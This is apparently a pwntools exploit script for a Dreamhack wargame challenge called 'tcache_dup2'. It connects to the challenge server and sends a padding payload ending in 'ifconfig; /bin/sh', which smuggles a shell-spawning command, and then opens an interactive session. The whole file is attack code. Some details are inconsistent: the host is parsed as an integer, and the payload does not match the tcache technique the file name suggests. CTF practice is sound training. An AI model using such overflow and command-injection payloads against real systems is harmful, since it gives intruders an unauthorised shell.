from pwn import *

#context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./tcache_dup2")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


payload = b"A" * 24
payload += b"B" * 8
payload += b"ifconfig"
payload += b"; /bin/sh"

p.sendlineafter(b"name: ", payload)

p.interactive()
